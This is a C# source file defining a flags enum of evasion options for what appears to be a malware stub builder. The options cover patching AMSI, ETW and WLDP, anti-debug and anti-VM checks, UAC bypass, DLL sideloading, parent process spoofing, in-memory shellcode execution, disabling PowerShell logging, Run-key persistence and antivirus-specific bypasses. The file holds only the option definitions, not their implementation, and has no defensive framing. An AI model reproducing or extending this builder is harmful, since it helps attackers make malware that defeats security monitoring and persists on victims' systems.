using System;

namespace NRE.Core.Evasion
{
/// <summary>
/// Evasion toggles embedded in stub; builder sets these when generating the stub.
/// </summary>
[Flags]
public enum EvasionOptions : uint
{
    None = 0,
    PatchAMSI = 1 << 0,
    PatchETW = 1 << 1,
    PatchWLDP = 1 << 2,
    AntiDebug = 1 << 3,
    AntiSandbox = 1 << 4,
    AntiVM = 1 << 5,
    IndirectSyscalls = 1 << 6,
    AmsiHBP = 1 << 7,
    UnhookNtdll = 1 << 8,
    UacBypass = 1 << 9,
    DllSideload = 1 << 10,
    ParentSpoof = 1 << 11,
    /// <summary>Execute shellcode via CLR thread pool (in-memory, no CreateThread).</summary>
    ExecuteThreadPool = 1 << 12,
    /// <summary>Disable script block logging (PowerShell).</summary>
    DisableScriptBlockLog = 1 << 13,
    /// <summary>Install/copy to AppData and add Run key for startup.</summary>
    PersistStartup = 1 << 14,
    /// <summary>Detect AV vendor at runtime and apply vendor-specific bypass set.</summary>
    AvSpecificBypass = 1 << 15,
}
}
